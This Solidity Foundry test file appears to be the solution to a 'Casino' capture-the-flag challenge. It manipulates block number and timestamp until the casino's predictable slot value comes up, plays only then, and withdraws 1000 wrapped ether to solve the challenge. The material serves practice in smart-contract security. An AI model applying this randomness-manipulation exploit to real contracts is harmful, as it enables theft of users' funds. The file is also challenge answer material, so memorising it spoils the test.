// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {IERC20} from "openzeppelin-contracts/contracts/token/ERC20/extensions/ERC20Wrapper.sol";
import {Test} from "forge-std/Test.sol";
import {CasinoBase, Casino} from "src/Casino/Casino.sol";

contract CasinoTest is Test {
    CasinoBase public base;
    Casino public casino;

    address public wNative;
    address public challenger;

    function setUp() external {
        uint256 startTime = block.timestamp + 60;
        uint256 endTime = startTime + 60;
        uint256 fullScore = 100;

        base = new CasinoBase(startTime, endTime, fullScore);
        base.setup();
        casino = base.casino();
        wNative = address(base.wNative());

        challenger = makeAddr("challenger");
    }

    function testExploit() public {
        vm.startPrank(challenger);
        for (uint256 i; i < 100; ++i) {
            vm.roll(block.number + i);
            vm.warp(block.timestamp + i);

            if (casino.slot() == 10) {
                casino.play(wNative, 100 ether);
            }
        }

        casino.withdraw(wNative, 1000 ether);
        vm.stopPrank();

        base.solve();
        assertTrue(base.isSolved());
    }
}
